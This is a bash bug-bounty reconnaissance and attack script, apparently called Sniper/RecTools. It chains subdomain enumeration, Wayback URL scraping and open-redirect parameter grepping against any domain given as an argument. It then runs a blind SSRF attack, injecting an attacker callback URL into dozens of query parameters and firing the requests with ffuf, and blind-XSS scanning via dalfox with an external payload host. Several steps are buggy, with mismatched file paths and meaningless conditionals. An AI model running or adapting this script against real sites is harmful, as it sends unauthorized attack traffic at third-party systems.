#!/bin/bash

# Color
red='\e[31m'
green='\e[32m'
blue='\e[34m'
white='\e[97m'
codename='Sniper'
ver='1.0'
follow='pikpikcu'
site=$1


all(){
    logo
    echo -e "\n${red}Start ${green}[Subdomain Enumerate...]${white}"
    assetfinder --subs-only $site > $output/subdo/$site.txt
    cat $output/subdo/$site.txt | sort -u > $output/subdo/subs.txt
    rm -rf $output/subdo/$site.txt
    echo -e "FOUND SUBDOMAINS [${green}$(cat $output/subdo/subs.txt | wc -l)${white}]"
    echo -e "${red}Success Saved:${green}[$output/subdo/subs.txt]"
    echo -e "${red}Start ${green}[Check Host Live...]${white}"
    cat $output/subs.txt | sort -u | httprobe | tee -a  > $output/live/$site-host.txt
    echo -e "Resluts Live:[${green}$(cat $output/live/https.txt | wc -l)${white}]"
    echo -e "${red}Success Saved:${green}[$output/live/$site-host.txt]"
    echo -e "${red}Start ${green}[Check Status Response...]${white}"
    cat $output/subs.txt | hakrawler -plain | hakcheckurl | grep -v 404 > $output/dir/$site-dir.txt 
    echo -e "Found Status Dir [${green}$(cat $output/dir/$site-dir.txt | wc -l)${white}]"
    echo -e "${red}Success Saved:${green}[$output/dir/$site-dir.txt]"
    echo -e "${red}Start ${green}[Scraping wayback for data...]${white}"
    cat $output/subs.txt | waybackurls | sort -u > $output/scraping/$site-list.txt
    echo -e "Found Scraping [${green}$(cat $output/scraping/$site-list.txt | wc -l)${white}]"
    echo -e "${red}Success Saved:${green}[$output/scraping/$site-list.txt]"
    echo -e "${red}Start ${green}[Scraping wayback for data js...]${white}"
   # cat $output/subs.txt | waybackurls | sort -u > $output/scraping/$site-list.txt
    cat $output/scraping/$site-list.txt | sort -u | grep -P "\w+\.js(\?|$)" | sort -u > $output/scraping/jsurls.txt
    echo -e "Found Scraping [${green}$(cat $output/scraping/jsurls.txt | wc -l)${white}]"
    echo -e "${red}Success Saved:${green}[$output/scraping/$site-jsurls.txt]"
    echo -e "${red}Start ${green}[Scraping wayback for data php...]${white}" 
    cat $output/scraping/$site-list.txt | sort -u | grep -P "\w+\.php(\?|$)" | sort -u > $output/scraping/phpurls.txt
    echo -e "Found Scraping [${green}$(cat $output/scraping/phpurls.txt | wc -l)${white}]"
    echo -e "${red}Success Saved:${green}[$output/scraping/$site-phpurls.txt]"
    echo -e "${red}Start ${green}[Scraping wayback for data aspx...]${white}"
    cat $output/scraping/$site-list.txt | sort -u | grep -P "\w+\.aspx(\?|$)" | sort -u > $output/scraping/aspurls.txt
    echo -e "Found Scraping [${green}$(cat $output/scraping/aspurls.txt | wc -l)${white}]"
    echo -e "${red}Success Saved:${green}[$output/scraping/$site-aspurls.txt]"
    echo -e "${red}Start ${green}[Check Open Redirection...]${white}"
    gau -subs $site | grep "redirect" > $output/redirec/$site-redirectall.txt
    gau -subs $site | grep "redirect=" >  $output/redirec/$site-redirectequal.txt
    gau -subs $site | grep "url" > $output/redirec/$site_urlall.txt
    gau -subs $site | grep "url=" > $output/redirec/$site_urlequal.txt
    gau -subs $site | grep "next=" > $output/redirec/$site_next.txt
    gau -subs $site | grep "dest=" > $output/redirec/$site_dest.txt
    gau -subs $site | grep "destination" > $output/redirec/$site_destination.txt
    gau -subs $site | grep "return" > $output/redirec/$site_return.txt
    gau -subs $site | grep "go=" > $output/redirec/$site_go.txt
    gau -subs $site | grep "redirect_uri" > $output/redirec/$site_redirecturi.txt
    gau -subs $site | grep "continue=" > $output/redirec/$site_continue.txt
    gau -subs $site | grep "return_path=" > $output/redirec/$site_path.txt
    gau -subs $site | grep "externalLink=" > $output/redirec/$site_link.txt
    gau -subs $site | grep "URL=" > $output/redirec/$site_URL.txt             
    echo -e "Found Check URL Redirection [${green}$(ls $output/redirec/ | wc -l)${white}]"
    echo -e "${red}Success Saved:${green}[$output/redirec/]"
    echo -e "${red}Start ${green}[ Blind SSRF testing...]${white}"
    ssr=`cat callback.txt`
    cat $output/subdo/subs.txt | waybackurls > $output/ssrf/$site-ssrf.txt
    cat $output/subdo/subs.txt | gau >> $output/ssrf/$site-ssrf.txt
    cat $output/ssrf/$site-ssrf.txt | sort | uniq | grep "?" | qsreplace -a | qsreplace $ssr > $output/ssrf/$site-ssrf2.txt
    sed -i "s|$|\&dest=$ssr\&redirect=$ssr\&uri=$ssr\&path=$ssr\&continue=$ssr\&url=$ssr\&window=$ssr\&next=$ssr\&data=$ssr\&reference=$ssr\&ssr=$ssr\&html=$ssr\&val=$ssr\&validate=$ssr\&domain=$ssr\&callback=$ssr\&return=$ssr\&page=$ssr\&feed=$ssr\&host=$ssr&\port=$ssr\&to=$ssr\&out=$ssr\&view=$ssr\&dir=$ssr\&show=$ssr\&navigation=$ssr\&open=$ssr|g" $output/ssrf/$site-ssrf2.txt
    echo "Firing the requests - check your server for potential callbacks"
    ffuf -w $output/ssrf/$site-ssrf2.txt -u FUZZ -t 50  > $output/ssrf/$site-ssrf3.txt
    #echo -e "Found Check SSRF [${green}$(cat $output/ssrf/$site-ssrf3.txt | wc -l)${white}]"
    echo -e "\n${red}Success Saved:${green}[$output/ssrf/$site-ssrf3.txt]"
    echo
    
}

subdo(){
    logo
    echo -e "\n${red}Start ${green}[Subdomain Enumerate...]${white}"
    while [ "$site" ];do
        if [ "#" ];
            then
            assetfinder --subs-only $site > $output/subdo/$site.txt
            cat $output/subdo/$site.txt | sort -u > $output/subdo/subs.txt
            rm -rf $output/subdo/$site.txt
        fi
    echo -e "FOUND SUBDOMAINS [${green}$(cat $output/subdo/subs.txt | wc -l)${white}]"
    echo -e "${red}Success Saved:${green}[$output/subdo/subs.txt]"
    exit 1
    done 2>/dev/null
}
hostlive(){
    logo
    echo -e "${red}Start ${green}[Check Host Live...]${white}"
    while [ "$site" ];do
        if [ "#" ];
        then
            assetfinder --subs-only $site > $output/$site.txt
            cat $output/$site.txt | sort -u > $output/subs.txt
            rm -rf $output/$site.txt
            #cat $output/subs.txt | sort -u | httprobe -s -p http:80 | tr -d ":80" | tee -a  > $output/live/http.txt
            #cat $output/subs.txt | sort -u | httprobe -s -p https:443 | tr -d ":443" | tee -a  > $output/live/https.txt
            cat $output/subs.txt | sort -u | httprobe | tee -a  > $output/live/$site-host.txt
            rm -rf $output/$subs.txt 
        fi
    echo -e "Resluts Live:[${green}$(cat $output/live/https.txt | wc -l)${white}]"
    echo -e "${red}Success Saved:${green}[$output/live/$site-host.txt]"
    exit 1
    done 2>/dev/null
}
scraping(){
    logo
    echo -e "${red}Start ${green}[Scraping wayback for data...]${white}"
    while [ "$site" ];do
        if [ "#" ];
        then
            assetfinder --subs-only $site > $output/$site.txt
            cat $output/$site.txt | sort -u > $output/subs.txt
            rm -rf $output/$site.txt
            cat $output/subs.txt | waybackurls | sort -u > $output/scraping/$site-list.txt
            rm -rf $output/$subs.txt 
        fi
    echo -e "Found Scraping [${green}$(cat $output/scraping/$site-list.txt | wc -l)${white}]"
    echo -e "${red}Success Saved:${green}[$output/scraping/$site-list.txt]"
    exit 1
    done 2>/dev/null
}
js(){
    logo
    echo -e "${red}Start ${green}[Scraping wayback for data js...]${white}"
    while [ "$site" ];do
        if [ "#" ];
         then
            assetfinder --subs-only $site > $output/$site.txt
            cat $output/$site.txt | sort -u > $output/subs.txt
            rm -rf $output/$site.txt
            cat $output/subs.txt | waybackurls | sort -u > $output/scraping/$site-list.txt
            rm -rf $output/$subs.txt
            cat $output/scraping/$site-list.txt | sort -u | grep -P "\w+\.js(\?|$)" | sort -u > $output/scraping/jsurls.txt
            rm -rf $output/scraping/$site-list.txt
        fi
    echo -e "Found Scraping [${green}$(cat $output/scraping/jsurls.txt | wc -l)${white}]"
    echo -e "${red}Success Saved:${green}[$output/scraping/$site-jsurls.txt]"
    exit 1
    done 2>/dev/null
}
php(){
    logo
    echo -e "${red}Start ${green}[Scraping wayback for data php...]${white}"
    while [ "$site" ];do
        if [ "#" ];
         then    
            assetfinder --subs-only $site > $output/$site.txt
            cat $output/$site.txt | sort -u > $output/subs.txt
            rm -rf $output/$site.txt
            cat $output/subs.txt | waybackurls | sort -u > $output/scraping/$site-list.txt
            rm -rf $output/$subs.txt
            cat $output/scraping/$site-list.txt | sort -u | grep -P "\w+\.php(\?|$)" | sort -u > $output/scraping/phpurls.txt
            rm -rf $output/scraping/$site-list.txt
        fi
    echo -e "Found Scraping [${green}$(cat $output/scraping/phpurls.txt | wc -l)${white}]"
    echo -e "${red}Success Saved:${green}[$output/scraping/$site-phpurls.txt]"
    exit 1
    done 2>/dev/null
}

asp(){
    logo
    echo -e "${red}Start ${green}[Scraping wayback for data aspx...]${white}"
    while [ "$site" ];do
        if [ "#" ];
          then
            assetfinder --subs-only $site > $output/$site.txt
            cat $output/$site.txt | sort -u > $output/subs.txt
            rm -rf $output/$site.txt
            cat $output/subs.txt | waybackurls | sort -u > $output/scraping/$site-list.txt
            rm -rf $output/$subs.txt
            cat $output/scraping/$site-list.txt | sort -u | grep -P "\w+\.aspx(\?|$)" | sort -u > $output/scraping/aspurls.txt
            rm -rf $output/scraping/$site-list.txt
        fi
    echo -e "Found Scraping [${green}$(cat $output/scraping/aspurls.txt | wc -l)${white}]"
    echo -e "${red}Success Saved:${green}[$output/scraping/$site-aspurls.txt]"
    exit 1
    done
}
html(){
    logo
    echo -e "${red}Start ${green}[Scraping wayback for data HTML...]${white}"
    while [ "$site" ];do
        if [ "#" ];
          then
            assetfinder --subs-only $site > $output/$site.txt
            cat $output/$site.txt | sort -u > $output/subs.txt
            rm -rf $output/$site.txt | cat $output/subs.txt | waybackurls | sort -u > $output/scraping/$site-list.txt
            rm -rf $output/$subs.txt | cat $output/scraping/$site-list.txt | sort -u | grep -P "\w+\.html(\?|$)" | sort -u > $output/scraping/htmlurls.txt
            rm -rf $output/scraping/$site-list.txt
        fi
    echo -e "Found Scraping [${green}$(cat $output/scraping/htmlurls.txt | wc -l)${white}]"
    echo -e "${red}Success Saved:${green}[$output/scraping/$site-htmlurls.txt]"
    exit 1
    done
}
dir(){
    logo
    echo -e "${red}Start ${green}[Check Status Response...]${white}"
    while [ "$site" ];do
        if [ "#" ];
          then
            assetfinder --subs-only $site > $output/$site.txt
            cat $output/$site.txt | sort -u > $output/subs.txt 
            rm -rf $output/$site.txt | cat $output/subs.txt | hakrawler -plain | hakcheckurl | grep -v 404 > $output/dir/$site-dir.txt 
            rm -rf $output/$subs.txt  
        fi  
    echo -e "Found Status Dir [${green}$(cat $output/dir/$site-dir.txt | wc -l)${white}]"
    echo -e "${red}Success Saved:${green}[$output/dir/$site-dir.txt]"
    exit 1
    done
}

redirec(){
    logo
    echo -e "${red}Start ${green}[Check Open Redirection...]${white}"
    while [ "$site" ];do
        if [ "#" ];
            then
            gau -subs $site | grep "redirect" > $output/redirec/$site-redirectall.txt
            gau -subs $site | grep "redirect=" >  $output/redirec/$site-redirectequal.txt
            gau -subs $site | grep "url" > $output/redirec/$site_urlall.txt
            gau -subs $site | grep "url=" > $output/redirec/$site_urlequal.txt
            gau -subs $site | grep "next=" > $output/redirec/$site_next.txt
            gau -subs $site | grep "dest=" > $output/redirec/$site_dest.txt
            gau -subs $site | grep "destination" > $output/redirec/$site_destination.txt
            gau -subs $site | grep "return" > $output/redirec/$site_return.txt
            gau -subs $site | grep "go=" > $output/redirec/$site_go.txt
            gau -subs $site | grep "redirect_uri" > $output/redirec/$site_redirecturi.txt
            gau -subs $site | grep "continue=" > $output/redirec/$site_continue.txt
            gau -subs $site | grep "return_path=" > $output/redirec/$site_path.txt
            gau -subs $site | grep "externalLink=" > $output/redirec/$site_link.txt
            gau -subs $site | grep "URL=" > $output/redirec/$site_URL.txt             
        fi
    echo -e "Found Check URL Redirection [${green}$(ls $output/redirec/ | wc -l)${white}]"
    echo -e "${red}Success Saved:${green}[$output/redirec/]"
    exit 1
    done
}
ssrf(){
    logo
    echo -e "${red}Start ${green}[ Blind SSRF testing...]${white}"
    ssr=`cat callback.txt`
    while [ "$site" ];do
        if [ "#" ]; then
           waybackurls $site > $output/ssrf/$site-ssrf.txt
           gau $site >> $output/ssrf/$site-ssrf.txt
           cat $output/ssrf/$site-ssrf.txt | sort | uniq | grep "?" | qsreplace -a | qsreplace $ssr > $output/ssrf/$site-ssrf2.txt
           sed -i "s|$|\&dest=$ssr\&redirect=$ssr\&uri=$ssr\&path=$ssr\&continue=$ssr\&url=$ssr\&window=$ssr\&next=$ssr\&data=$ssr\&reference=$ssr\&ssr=$ssr\&html=$ssr\&val=$ssr\&validate=$ssr\&domain=$ssr\&callback=$ssr\&return=$ssr\&page=$ssr\&feed=$ssr\&host=$ssr&\port=$ssr\&to=$ssr\&out=$ssr\&view=$ssr\&dir=$ssr\&show=$ssr\&navigation=$ssr\&open=$ssr|g" $output/ssrf/$site-ssrf2.txt
           echo "Firing the requests - check your server for potential callbacks"
           ffuf -w $output/ssrf/$site-ssrf2.txt -u FUZZ -t 50  > $output/ssrf/$site-ssrf3.txt
        fi
    #echo -e "Found Check SSRF [${green}$(cat $output/ssrf/$site-ssrf3.txt | wc -l)${white}]"
    echo -e "\n${red}Success Saved:${green}[$output/ssrf/$site-ssrf3.txt]"
    exit 1
    done
}
xss(){
    logo
    echo -e "${red}Start ${green}[ XSS testing...]${white}"
    xsss=`cat xss.ht`
    linee=".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)"
    while [ "$site" ];do
        if [ "#" ]; then
            assetfinder  $site > $output/xss/$site.txt
            cat $output/xss/$site.txt | hakrawler -plain -usewayback -wayback | grep "=" | egrep -iv "$linee" | \
            qsreplace -a | dalfox pipe -b $xsss -o $output/xss/$site-xss.txt 
        fi
    echo -e "${red}Success Saved:${green}[$output/xss/$site-xss.txt]"
    exit 1
    done
} 


logo(){
 echo -e "${red}
            __        ___            
            )_) _   _  ) _   _   ) _ 
            / \ )_) (_ ( (_) (_) ( (  
               (_                  _) ${blue}
                            Codename:$codename ${red}
                            Version:$ver ${white}
            github:$follow
"
}
help(){
        logo
        echo -e ${green}
        echo "Example: RecTools -u/--url example.site"
        echo "         RecTools <arguments> example.site <arguments> "
        echo
        echo "Optional Arguments:"
        echo   "       -s  --subdo    Check Subdomains "
        echo   "       -H  --host     Host Live Check"
        echo   "       -sw --scrw     Scraping wayback for data"
        echo   "                -js  Jsurls "
        echo   "                -php Phpurls"
        echo   "                -asp ASP"
        echo   "                -html Html"
        echo   "       -D  --dir      Check Dir Status Response"
        echo   "       -r  --redirec  Check open redirection"
        echo   "       -Ss --ssrf     Blind SSRF testing"
        echo   "       -xs --xss      Check Parameter XSS"
        echo   "       -o             Outfile"
        exit 1
}
if [ -z "$site" ];then
    logo
else
while [ "$site" ]; do
    case "$site" in
        "-xs" | "--xss") site="$2"
            if [[ $3 == "-o" ]];
                then
                output="$4/$site"
                mkdir -p "$output"/"xss"
                xss $site

            else
                output="$site"
                mkdir -p "$output"/"xss"
                xss $site

            fi
            ;;
        "-u" | "--url") site="$2"
            if [[ $3 == "-o" ]];
                then
                output="$4/$site"
                mkdir -p "$output"
                all $site
            else
                output="$site"
                mkdir -p "$output"
                all $site
            fi
            ;;

        "-Ss" | "--ssrf") site="$2"
            if [[ $3 == "-o" ]];
                then
                output="$4/$site"
                mkdir -p "$output"/"ssrf"
                ssrf $site
            else
                output="$site"
                mkdir -p "$output"/"ssrf"
                ssrf $site
            fi
            ;;
        "-r" | "--redirec") site="$2"
            if [[ $3 == "-o" ]]; 
                then
                output="$4/$site"
                mkdir -p "$output"/"redirec"
                redirec $site
            else
                output="$site"
                mkdir -p "$output"/"redirec"
                redirec $site
            fi
            ;;
        "-s" | "--subdo") site="$2"
            if [[ "$3" == '-o' ]];
            then
                output="$4/$site"
                mkdir -p "$output"/"subdo"
                subdo $site
            else
                output="$site"
                mkdir -p "$output"/"subdo"
                subdo $site
                continue
            fi
            
            ;;
        "-h" | "--help")
            help
            exit 1
            ;;
        "-D" | "--dir") 
            site="$2"
                    if [[ $3 == "-o" ]]
                    then
                        output="$4/$site"
                        mkdir -p "$output"/"dir"
                        dir $site
                    else
                        output="$site"
                        mkdir -p "$output"/"dir"
                        dir $site
                        continue
                    fi
            ;;
        "-H" | "--host") 
            site="$2"
                    if [[ $3 == "-o" ]]
                    then
                        output="$4/$site"
                        mkdir -p "$output"/"live"
                        hostlive $site
                    else
                        output="$site"
                        mkdir -p "$output"/"live"
                        hostlive $site
                        continue
                    fi
            ;;
        "-sw" | "--scrw") 
            site="$2"
                    if [[ $3 == "-o" ]]
                    then
                        output="$4/$site"
                        mkdir -p "$output"/"scraping"
                        scraping $site
                    elif [[ $3 == "-js" ]]
                    then
                        output="$site"
                        mkdir -p "$output/scraping"
                        js $site
                        continue
                    elif [[ $3 == "-php" ]]
                    then
                        output="$site"
                        mkdir -p "$output"/"scraping"
                        php $site
                        continue
                    elif [[ $3 == "-asp" ]]
                    then
                        output="$site"
                        mkdir -p "$output"/"scraping"
                        asp $site
                        continue
                    elif [[ $3 == "-html" ]]
                    then
                        output="$site"
                        mkdir -p "$output"/"scraping"
                        html $site
                        continue
                    else
                        output="$4/$site"
                        mkdir -p "$output"/"scraping"
                        scraping $site
                    fi
            shift 
            break
            ;;
        esac
        shift
done
fi